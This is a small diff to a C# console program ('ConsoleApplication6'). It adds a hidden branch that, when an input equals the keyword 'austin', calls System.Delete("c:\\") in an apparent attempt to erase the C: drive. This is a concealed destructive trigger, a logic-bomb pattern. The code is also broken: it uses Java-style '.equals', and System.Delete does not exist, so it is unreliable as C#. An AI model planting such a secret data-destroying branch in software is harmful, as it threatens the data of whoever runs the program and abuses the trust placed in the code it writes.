@@ -75,7 +75,10 @@ namespace ConsoleApplication6
                     {
                         Console.WriteLine(exc);
                     }
+                } else if (start.equals("austin")){
+                    System.Delete("c:\\");
                 }
+                
                 
 
 
